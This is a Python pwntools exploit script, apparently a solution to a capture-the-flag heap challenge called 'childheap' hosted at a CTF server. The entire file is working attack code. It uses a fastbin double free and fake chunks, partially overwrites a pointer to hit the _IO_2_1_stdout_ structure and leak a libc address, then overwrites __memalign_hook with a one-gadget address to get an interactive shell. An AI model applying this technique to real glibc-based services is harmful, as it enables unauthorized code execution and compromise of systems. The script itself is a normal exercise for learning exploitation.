import sys
from pwn import *

if len(sys.argv) != 2:
	print "sys.argv[1] = r : remote	l : local"
	exit()

#context.log_level = 'debug'

def malloc(index, size, content):
	p.sendafter('>', '1')
	
	p.sendlineafter('index:', str(index))
	p.sendlineafter('size:', str(size))
	p.sendafter('content: ', str(content))

def free(index):
	p.sendafter('>', '2')

	p.sendlineafter('index:', str(index))

if sys.argv[1].strip() == 'l':
	p = process('./childheap')
elif sys.argv[1].strip() == 'r':
	p = remote('ctf.j0n9hyun.xyz', 3033)

e = ELF('./childheap')

if sys.argv[1].strip() == 'l':
	l = e.libc
elif sys.argv[1].strip() == 'r':
	l = ELF('./libc.so.6')

#pause()

malloc(0, 0x40, 'a')
malloc(1, 0x40, 'a')
malloc(2, 0x20, p64(0) + p64(0x51)) # make fake chunk in real chunk
malloc(3, 0x60, 'a' * 0x20 + p64(0) + p64(0xb1))
malloc(4, 0x60, 'a' * 0x10 + p64(0) + p64(0x51))

free(0)
free(1)
free(0)

free(3)

malloc(0, 0x40, chr(0xb0))

malloc(1, 0x40, 'a')
malloc(0, 0x40, 'a')
malloc(0, 0x40, 'a' * 0x10 + p64(0) + p64(0x91))

free(3)
free(0)
malloc(0, 0x40, 'a' * 0x10 + p64(0) + p64(0x71) + chr(0xdd) + chr(0x55)) #local
#malloc(0, 0x40, 'a' * 0x10 + p64(0) + p64(0x71) + chr(0x08) + chr(0x57)) #remote

malloc(3, 0x60, 'a')

try:
	fake = p64(0xfbad1800)
	fake += p64(0) * 3 + '\x00'
	malloc(4, 0x60, 'a' * 0x33 + fake)
except Exception as e:
	os.execl('/usr/bin/python', 'childheap.py', *sys.argv) 

p.recvuntil('\x7f')
libc = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 131 - l.sym['_IO_2_1_stdout_']
log.info('libc : ' + hex(libc))

malloc(0, 0x60, 'a')
malloc(1, 0x60, 'a')

free(0)
free(1)
free(0)

malloc(0, 0x60, p64(libc + l.sym['__memalign_hook'] - 0x13))
malloc(1, 0x60, 'a')
malloc(0, 0x60, 'a')
malloc(0, 0x60, 'a' * (0x13)+ p64(libc + 0xf02a4))

p.sendafter('>', '1')

p.sendlineafter('index:', str(0))
p.sendlineafter('size:', str(30))


p.interactive()